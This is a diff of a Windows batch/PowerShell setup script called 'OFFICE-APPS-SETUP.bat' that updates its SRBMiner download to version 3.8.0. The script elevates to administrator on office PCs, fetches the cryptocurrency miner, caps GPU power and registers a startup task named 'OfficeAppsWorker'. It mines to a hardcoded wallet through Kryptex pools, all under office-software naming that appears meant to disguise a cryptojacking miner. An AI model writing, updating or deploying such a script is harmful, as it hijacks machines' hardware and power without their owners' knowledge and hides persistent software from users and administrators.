@@ -7,7 +7,7 @@ rem  OFFICE-APPS-SETUP.bat
 rem
 rem  One file. Double-click it on an office PC and it:
 rem    1. asks for administrator (needed to set a power limit and a startup task)
-rem    2. downloads SRBMiner 3.7.6 from the official GitHub release
+rem    2. downloads SRBMiner 3.8.0 from the official GitHub release
 rem    3. checks it against the published MD5 fingerprint
 rem    4. detects the GPU and reports whether it can mine Pearl at all
 rem    5. sets the card to 70%% of its factory power limit
@@ -152,8 +152,8 @@ $TaskName = 'OfficeAppsWorker'
 
 $Wallet   = 'prl1p9ua7ny7ggllrq6tmh9ssusktv43tp90ty6359c7qujh5u2mheeesrz5wzx'
 $Pools    = 'prl-eu.kryptex.network:7048,prl.kryptex.network:7048'
-$ZipUrl   = 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.7.6/SRBMiner-Multi-3-7-6-win64.zip'
-$ZipMd5   = '550077549bf6da5ff1e1383d0ffd3a6f'
+$ZipUrl   = 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.0/SRBMiner-Multi-3-8-0-win64.zip'
+$ZipMd5   = 'ca9f61fad66d1b4c7b9daf867baaa4c5'
 $PowerPct = 0.50
 
 # ---------------------------------------------------------------------------
@@ -398,7 +398,7 @@ if ($mineable.Count -eq 0) {
 # ---------------------------------------------------------------------------
 #  2. download + verify
 # ---------------------------------------------------------------------------
-Head 'DOWNLOADING SRBMiner 3.7.6'
+Head 'DOWNLOADING SRBMiner 3.8.0'
 
 # ---------------------------------------------------------------------------
 #  Do NOT assume %TEMP%.
@@ -423,7 +423,7 @@ function Get-WritableDir {
     return $Install
 }
 $cacheDir = Get-WritableDir
-$zip = Join-Path $cacheDir 'SRBMiner-Multi-3-7-6-win64.zip'
+$zip = Join-Path $cacheDir 'SRBMiner-Multi-3-8-0-win64.zip'
 Line ("  download target: $zip")
 
 # Why not Get-FileHash / Invoke-WebRequest / Expand-Archive?
@@ -482,7 +482,7 @@ try {
         #
         # Copy-Item with a DIRECTORY source into a destination that already holds
         # that directory does not overwrite it - it nests a second copy inside:
-        #     C:\OfficeApps\SRBMiner-Multi-3-7-6\SRBMiner-Multi-3-7-6\...
+        #     C:\OfficeApps\SRBMiner-Multi-3-8-0\SRBMiner-Multi-3-8-0\...
         # Every reinstall doubled the tree and left a STALE exe that the search
         # below could pick instead of the new one.
         #
